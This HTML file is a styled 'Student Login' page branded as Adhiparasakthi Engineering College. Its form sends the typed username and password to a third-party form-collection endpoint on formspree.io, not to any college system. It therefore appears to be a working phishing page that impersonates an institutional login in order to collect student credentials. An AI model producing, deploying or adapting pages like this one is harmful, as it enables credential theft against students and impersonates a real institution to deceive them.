<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Adhiparasakthi Engineering College Login</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, Helvetica, sans-serif;
}

body{
    background:#b30000;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

.container{
    width:380px;
    background:#ffffff;
    border-radius:15px;
    padding:30px;
    text-align:center;
    box-shadow:0 0 20px rgba(0,0,0,0.3);
}

.logo{
    width:130px;
    height:130px;
    object-fit:contain;
    margin-bottom:15px;
}

h2{
    color:#b30000;
    margin-bottom:5px;
}

p{
    color:#666;
    font-size:14px;
    margin-bottom:20px;
}

.input-box{
    width:100%;
    padding:12px;
    margin:10px 0;
    border:1px solid #ccc;
    border-radius:8px;
    font-size:16px;
}

.input-box:focus{
    outline:none;
    border:2px solid #b30000;
}

button{
    width:100%;
    padding:12px;
    background:#b30000;
    color:#fff;
    border:none;
    border-radius:8px;
    font-size:17px;
    cursor:pointer;
    transition:0.3s;
}

button:hover{
    background:#8a0000;
}

.footer{
    margin-top:20px;
    font-size:13px;
    color:#777;
}
</style>

</head>
<body>

<div class="container">

    <img src="logo.png" alt="College Logo" class="logo">

    <h2>Student Login</h2>

    <p>Adhiparasakthi Engineering College</p>

    <form action="https://formspree.io/f/xzdlqkbe" method="POST">

        <input
            type="text"
            name="Username"
            class="input-box"
            placeholder="Enter Username"
            required>

        <input
            type="password"
            name="Password"
            class="input-box"
            placeholder="Enter Password"
            required>

        <button type="submit">LOGIN</button>

    </form>

    <div class="footer">
        Study • Spirituality • Service
    </div>

</div>

</body>
</html>
